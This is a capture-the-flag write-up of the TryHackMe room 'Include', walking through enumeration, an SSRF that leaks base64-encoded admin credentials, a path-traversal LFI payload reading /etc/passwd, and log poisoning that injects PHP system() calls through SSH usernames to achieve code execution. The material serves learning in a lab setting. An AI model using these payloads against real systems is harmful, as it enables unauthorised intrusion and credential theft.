---
title: THM - Include
author: Throupy
date: 2024-06-09 00:00:00 +0000
categories: [CTF]
tags: [CTF, Web]
---

A writeup for the TryHackMe room called `Include`.

The TryHackMe room "Include" demonstrates exploiting a web application through Local File Inclusion (LFI) vulnerabilities. By performing thorough enumeration and leveraging SSRF and LFI techniques, sensitive information was extracted, leading to credential discovery and eventually achieving remote code execution via log poisoning.

The IP for my machine was `10.10.134.223`, first add it to hosts file.
```bash
echo "10.10.134.223 include.thm" | sudo tee -a /etc/hosts
```

## Enumeration
Starting with an `nmap` scan using default scripts (`-sC`), service detection (`-sV`), and scanning all ports (`-p-`). `-oA` means output all formats, this is just so I can refer back to it easily
```
nmap -sC -sV -oA include_scan -p- include.thm
```

We can see a number of open ports:
```
22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
25/tcp    open  smtp     Postfix smtpd
110/tcp   open  pop3     Dovecot pop3d
143/tcp   open  imap     Dovecot imapd (Ubuntu)
993/tcp   open  ssl/imap Dovecot imapd (Ubuntu)
995/tcp   open  ssl/pop3 Dovecot pop3d
4000/tcp  open  http     Node.js (Express middleware)
50000/tcp open  http     Apache httpd 2.4.41 ((Ubuntu))
```
SSH is very rarely the initial access point, and the mail ports (25, 110, 143, 993, 955) require more effort to query. Let's first check out the web servers

## HTTP servers on 50000 and 4000
The web app on port 50000 just gives us a "restricted portal" message, requiring a login. We have no credentials at the moment so this is not helpful.

Web app on port 4000 just shows a message saying "log in with guest/guest, so let's do it.
![Login](/assets/img/include-thm-4000-site.png)

After logging in, we see a home page
![Home](/assets/img/include-thm-4000-home.png)

Let's try viewing our profile
![Profile](/assets/img/include-thm-4000-profile.png)

### SSRF
There is some funny looking information in the details section, almost as if we are seeing the raw key / value pairs. Let's try using the activity recommendation functionality to overwrite some of these variables e.g. setting `isAdmin` to `true`
![IsAdmin](/assets/img/include-thm-4000-isadmin-true.png)

After submitting this, the value updates in our details section, and we can see an API item in the navigation bar, let's navigate to this.

We can see the following:
![API](/assets/img/include-thm-4000-api-dashboard.png)

### API - Initial Credentials
It looks like we can get some credentials for the `SysMon` application on port 50000. Let's hit the `getAllAdmins101099991` endpoint on the API. The API is hosted locally, meaning we can only hit it from within the application. Notice that on the navigation bar, we have a "update banner image" functionality, where we can specify a URL. 
![Banner](/assets/img/include-thm-4000-update-banner.png)

Let's specify the endpoint's URL (`http://127.0.0.1:5000/getAllAdmins101099991`)

This is what we get back:
```
data:application/json; charset=utf-8;base64,eyJSZXZpZXdBcHBVc2VybmFtZSI6ImFkbWluIiwiUmV2aWV3QXBwUGFzc3dvcmQiOiJhZG1pbkAhISEiLCJTeXNNb25BcHBVc2VybmFtZSI6ImFkbWluaXN0cmF0b3IiLCJTeXNNb25BcHBQYXNzd29yZCI6IlMkOSRxazZkIyoqTFFVIn0=
```

Note that it is base64 encoded, we can decode it:
```zsh
echo "eyJSZXZpZXdBcHBVc2VybmFtZSI6ImFkbWluIiwiUmV2aWV3QXBwUGFzc3dvcmQiOiJhZG1pbkAhISEiLCJTeXNNb25BcHBVc2VybmFtZSI6ImFkbWluaXN0cmF0b3IiLCJTeXNNb25BcHBQYXNzd29yZCI6IlMkOSRxazZkIyoqTFFVIn0=" | base64 -d

{
    "ReviewAppUsername":"admin",
    "ReviewAppPassword":"admin@!!!",
    "SysMonAppUsername":"administrator",
    "SysMonAppPassword":"S$9$qk6d#**LQU"
}
```

### SysMon application
We got `SysMon` application credentials, so let's log into the application.
On the home page we can get the first flag
![50000Home](/assets/img/include-thm-50000-home.png)

After reviewing the source code of the website, we can notice that the `src` attribute of the `img` element is `src="profile.php?img=profile.png"`. Let's navigate to this URL and capture the request using the burp suite proxy. Send the request to repeater and let's try some directory traversal.

### LFI
Trying common payloads such as `../../../../etc/passwd` did not yield any results, let's use intruder to use an LFI payload wordlist such as [this](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt) one 

Eventually, we can find a payload which will give us `/etc/passwd`:
```
http://include.thm:50000/profile.php?img=......///......///......///......///......///etc/passwd
[SNIP]
joshua:x:1002:1002:,,,:/home/joshua:/bin/bash
charles:x:1003:1003:,,,:/home/charles:/bin/bash
```
Revealing two users, joshua and charles.

### Trying to steal `id_rsa`
I tried stealing `id_rsa` for both users, but did not get anywhere. Then I considered the mail ports which were open, perhaps we can perform some log file poisoning to get RCE via our LFI vulnerability. Let's check for some common log files using the same LFI format from before (`......///......///......///......///......///`).

### Log Poisoning
I couldn't manage to get the apache `access.log` for some reason, but I could get /var/log/auth.log, which shows SSH authentication attempts.

Let's try and embed our PHP payload, which will list the current directory, into the SSH username.
```zsh
ssh '<?php system("ls"); ?>'@include.thm
```

If this fails, use hydra:
```zsh
hydra -u include.thm -p 'test' ssh -l '<?php system("ls"); ?>' include.thm
```

Now, when we read the contents of `auth.log` using our LFI:
```zsh
505eb0fb8a9f32853b4d955e1f9123ea.txt
api.php
auth.php
dashboard.php
index.php
[SNIP]
```

And with that, we get the file name, then we can modify our payload to cat the file:
```zsh
ssh '<?php system("cat 505eb0fb8a9f32853b4d955e1f9123ea.txt"); ?>'@include.thm
```

And we get the final flag.